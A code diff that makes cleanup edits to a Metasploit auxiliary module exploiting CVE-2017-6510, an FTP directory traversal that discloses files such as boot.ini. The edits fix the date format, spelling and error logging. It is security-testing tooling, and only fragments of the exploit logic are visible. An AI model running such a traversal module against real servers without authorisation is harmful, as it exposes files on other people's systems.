@@ -26,13 +26,13 @@ class MetasploitModule < Msf::Auxiliary
         [
           [ 'CVE', '2017-6510']
         ],
-      'DisclosureDate' => 'Mar 07 2017'
+      'DisclosureDate' => '2017-03-07'
     ))
 
     register_options(
       [
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),
-        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'boot.ini'])
+        OptString.new('PATH', [ true, "Path to the file to disclose, relative to the root dir.", 'boot.ini'])
       ])
   end
 
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
       connect_login
       sock = data_connect
       if sock.nil?
-        error_msg = 'data_connect failed; posssible invalid response'
+        error_msg = 'data_connect failed; possible invalid response'
         print_status(error_msg)
         elog(error_msg)
       else
@@ -69,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
         # read the file data from the socket that we opened
         # dont assume theres still a sock to read from. Per #7582
         if sock.nil?
-          error_msg = 'data_connect failed; posssible invalid response'
+          error_msg = 'data_connect failed; possible invalid response'
           print_status(error_msg)
           elog(error_msg)
           return
@@ -97,10 +97,10 @@ class MetasploitModule < Msf::Auxiliary
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
       vprint_error(e.message)
-      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
+      elog(e)
     rescue ::Timeout::Error, ::Errno::EPIPE => e
       vprint_error(e.message)
-      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
+      elog(e)
     ensure
       data_disconnect
       disconnect
